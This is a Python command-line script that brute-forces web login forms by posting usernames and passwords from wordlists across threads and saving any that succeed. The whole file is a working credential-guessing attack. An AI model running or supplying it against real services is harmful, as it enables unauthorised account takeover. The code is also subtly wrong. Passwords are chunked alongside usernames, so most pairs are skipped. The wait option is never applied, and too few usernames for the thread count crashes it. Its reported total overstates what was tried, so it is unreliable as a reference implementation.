import argparse
import requests
import threading
import time

def try_credentials(url, username, password):
    """
    Tries a single set of username and password credentials against the given URL.
    Returns True if the login is successful, False otherwise.
    """
    data = {
        "username": username,
        "password": password,
        "submit": "Login"
    }
    response = requests.post(url, data=data)
    if "Login failed" not in response.text:
        print("Login succeeded with username:", username, "and password:", password)
        with open("successful_logins.txt", "a") as f:
            f.write(username + ":" + password + "\n")
        return True
    return False

def run_dictionary_attack(url, username_file, password_file, num_threads):
    """
    Runs a dictionary attack using the given URL, username file, and password file.
    Uses the specified number of threads to speed up the attack.
    """
    # Read in the usernames and passwords
    with open(username_file, "r") as f:
        usernames = [line.strip() for line in f.readlines()]
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    # Split the usernames and passwords into equal-sized chunks
    chunk_size = len(usernames) // num_threads
    username_chunks = [usernames[i:i+chunk_size] for i in range(0, len(usernames), chunk_size)]
    password_chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]

    # Run the attack using multiple threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=try_credentials_chunk, args=(url, username_chunks[i], password_chunks[i]))
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

def try_credentials_chunk(url, usernames, passwords):
    """
    Tries all combinations of usernames and passwords in the given chunks against the given URL.
    """
    for username in usernames:
        for password in passwords:
            if try_credentials(url, username, password):
                return

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Test login credentials using a dictionary attack.")
    parser.add_argument("url", help="The URL to test.")
    parser.add_argument("username_file", help="The file containing the usernames to test.")
    parser.add_argument("password_file", help="The file containing the passwords to test.")
    parser.add_argument("-t", "--threads", type=int, default=4, help="The number of threads to use.")
    parser.add_argument("-w", "--wait", type=float, default=0, help="The amount of time to wait between requests (in seconds).")
    args = parser.parse_args()

    # Run the dictionary attack
    start_time = time.time()
    run_dictionary_attack(args.url, args.username_file, args.password_file, args.threads)
    end_time = time.time()

    # Print some statistics
    num_credentials = sum(1 for line in open(args.username_file)) * sum(1 for line in open(args.password_file))
    print("Tried {} credentials in {:.2f} seconds ({:.2f} credentials per second).".format(num_credentials, end_time - start_time, num_credentials / (end_time - start_time)))

if __name__ == "__main__":
    main()
